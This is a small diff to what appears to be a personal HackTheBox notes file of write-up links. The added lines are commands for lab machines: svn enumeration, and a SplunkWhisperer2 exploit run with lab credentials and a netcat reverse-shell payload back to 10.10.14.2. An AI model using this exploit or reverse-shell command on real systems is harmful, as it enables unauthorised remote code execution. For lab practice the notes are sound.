@@ -47,6 +47,11 @@ https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-14
 
 Doctor
 https://www.youtube.com/watch?v=2BvuoWG_r9Y
+ svn checkout svn://10.10.10.203
+svn diff -r 2
+
+git clone https://github.com/cnotin/SplunkWhisperer2.git
+python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.2 --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh '10.10.14.2' '1234''
 
 
 
